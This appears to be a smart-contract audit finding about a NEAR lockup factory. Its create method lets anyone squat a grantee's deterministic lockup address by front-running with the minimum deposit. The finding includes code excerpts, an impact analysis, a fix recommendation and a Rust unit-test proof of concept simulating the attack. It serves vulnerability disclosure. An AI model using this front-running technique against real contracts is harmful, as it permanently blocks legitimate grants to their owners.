### Title
Front-runnable lockup address squatting via permissionless `create()` with only `MIN_ATTACHED_BALANCE` - (File: lockup-factory/src/lib.rs)

### Summary
`LockupFactory::create` computes the deployment address deterministically from `owner_account_id` alone (`sha256(owner_account_id)[..20].<factory>`) and imposes no restriction on who may call it or what deposit they attach beyond `attached_deposit >= MIN_ATTACHED_BALANCE`. Any unprivileged party can call `create` for an arbitrary `owner_account_id` before the legitimate grantor does, permanently occupying that NEAR account with attacker-chosen minimal `LockupArgs`, since NEAR accounts cannot be recreated once they hold state.

### Finding Description
The binding that should hold is: `lockup_amount` deployed at `sha256(owner_account_id)[..20].<factory>` == the deposit the entitled grantor for `owner_account_id` intends to lock. This binding is broken because nothing in `create` ties `env::predecessor_account_id()` to `owner_account_id`, nor requires any specific caller/foundation authorization: [1](#0-0) 

```
#[payable]
pub fn create(
    &mut self,
    owner_account_id: ValidAccountId,
    ...
) -> Promise {
    assert!(env::attached_deposit() >= MIN_ATTACHED_BALANCE, "Not enough attached deposit");

    let byte_slice = env::sha256(owner_account_id.as_ref().as_bytes());
    let lockup_account_id =
        format!("{}.{}", hex::encode(&byte_slice[..20]), env::current_account_id());
    ...
``` [2](#0-1) 

The only guard is the deposit-size assertion; there is no check that the caller is the foundation, the owner, or any authorized party, and no check that the target account doesn't already logically "belong" to someone else pending creation. The deterministic address depends solely on `owner_account_id`, which is public knowledge (e.g., announced grant recipient). An attacker observes/predicts an intended grantee account name, then races the legitimate grantor's transaction by submitting their own `create("victim.near", ..., minimal_args)` with exactly `MIN_ATTACHED_BALANCE` and a higher gas price / earlier inclusion. `Promise::new(lockup_account_id).create_account()...` succeeds because the account does not yet exist, permanently claiming the name. When the legitimate grantor's transaction later executes the same `create` call, `create_account()` on an already-existing account fails, the whole promise chain fails, and `on_lockup_create`'s `is_promise_success()` check refunds the grantor's deposit — but the attacker's minimal, wrong-parameter lockup remains permanently deployed at the address reserved for `owner_account_id`. [3](#0-2) 

None of `assert_self`, `is_promise_success`, or the deposit-size assert address caller authorization — they only handle rollback of a failed creation, not prevention of front-running by an unauthorized caller.

### Impact Explanation
The legitimate grant for `owner_account_id` becomes permanently undeliverable to that deterministic address — NEAR account names cannot be recreated once they hold state, so the grantor has no path to deploy their intended lockup at the address the ecosystem/tooling expects for that owner. This matches the Critical category "funds permanently frozen" and "a lockup deployed with parameters its rightful creator never chose": the attacker deploys a lockup contract with `LockupArgs` of their choosing (arbitrary `lockup_duration`, `vesting_schedule`, `staking_pool_whitelist_account_id`, etc.) at an address that was supposed to represent `owner_account_id`'s legitimate grant. This is repeatable across any `owner_account_id` an attacker chooses to preempt, at a fixed cost of `MIN_ATTACHED_BALANCE` (3.5 NEAR) per squat, which the attacker retains ownership/control of (as `predecessor_account_id` on the squatting call), i.e., it's their own tokens locked under their own chosen terms in the name-slot meant for the victim.

### Likelihood Explanation
Preconditions are minimal: the attacker needs knowledge of the target `owner_account_id` (typically public/predictable ahead of a token grant) and `MIN_ATTACHED_BALANCE` (3.5 NEAR) of their own funds. No special privileges, keys, or roles are required — `create` is a fully public, unauthenticated method. The only competitive element is transaction ordering/timing versus the legitimate grantor, which is a standard front-running scenario on NEAR (mempool visibility / gas price / relative submission timing) and does not require validator collusion.

### Recommendation
Restrict `create` so that only an authorized party (e.g., `foundation_account_id`, or require `env::predecessor_account_id() == owner_account_id`, or an owner-signed allowlist/nonce mechanism) may create a lockup for a given `owner_account_id`, or incorporate an unpredictable/creator-bound salt into the derived account id so the address cannot be pre-claimed by an unrelated party.

### Proof of Concept
```rust
#[test]
fn test_create_lockup_frontrun_squats_address() {
    let mut context = VMContextBuilder::new()
        .current_account_id(account_factory())
        .predecessor_account_id(account_near())
        .finish();
    testing_env!(context.clone());

    let mut contract = LockupFactory::new(whitelist_account_id(), foundation_account_id());

    const LOCKUP_DURATION: u64 = 63036000000000000;
    let lockup_duration: WrappedTimestamp = LOCKUP_DURATION.into();

    // Attacker calls create() for victim's owner_account_id with minimal deposit
    context.is_view = false;
    context.predecessor_account_id = String::from(attacker_account());
    context.attached_deposit = MIN_ATTACHED_BALANCE; // exactly 3.5 NEAR
    testing_env!(context.clone());
    contract.create(account_tokens_owner(), lockup_duration, None, None, None, None);

    // Simulate account creation succeeding (attacker's promise chain succeeds)
    context.predecessor_account_id = account_factory();
    context.attached_deposit = 0;
    testing_env_with_promise_results(context.clone(), PromiseResult::Successful(vec![]));
    let attacker_result = contract.on_lockup_create(
        lockup_account(),
        MIN_ATTACHED_BALANCE.into(),
        String::from(attacker_account()),
    );
    assert_eq!(attacker_result, true); // attacker now "owns" the deterministic address

    // Legitimate grantor now attempts create() for same owner_account_id with real funds
    context.predecessor_account_id = String::from(account_tokens_owner());
    context.attached_deposit = ntoy(35); // intended full grant
    testing_env!(context.clone());
    contract.create(account_tokens_owner(), lockup_duration, None, None, None, None);

    // create_account() fails because account already exists -> promise fails
    context.predecessor_account_id = account_factory();
    context.attached_deposit = 0;
    testing_env_with_promise_results(context.clone(), PromiseResult::Failed);
    let grantor_result = contract.on_lockup_create(
        lockup_account(),
        ntoy(35).into(),
        String::from(account_tokens_owner()),
    );
    // Binding broken: lockup_amount at the address (MIN_ATTACHED_BALANCE, attacker's) != grantor's intended ntoy(35)
    assert_eq!(grantor_result, false); // legitimate grantor permanently blocked from this address
}
```

    pub fn on_lockup_create(
        &mut self,
        lockup_account_id: AccountId,
        attached_deposit: U128,
        predecessor_account_id: AccountId,
    ) -> bool {
        assert_self();

        let lockup_account_created = is_promise_success();

        if lockup_account_created {
            env::log(
                format!("The lockup contract {} was successfully created.", lockup_account_id)
                    .as_bytes(),
            );
            true
        } else {
            env::log(
                format!(
                    "The lockup {} creation has failed. Returning attached deposit of {} to {}",
                    lockup_account_id, attached_deposit.0, predecessor_account_id
                )
                    .as_bytes(),
            );
            Promise::new(predecessor_account_id).transfer(attached_deposit.0);
            false
        }
    }
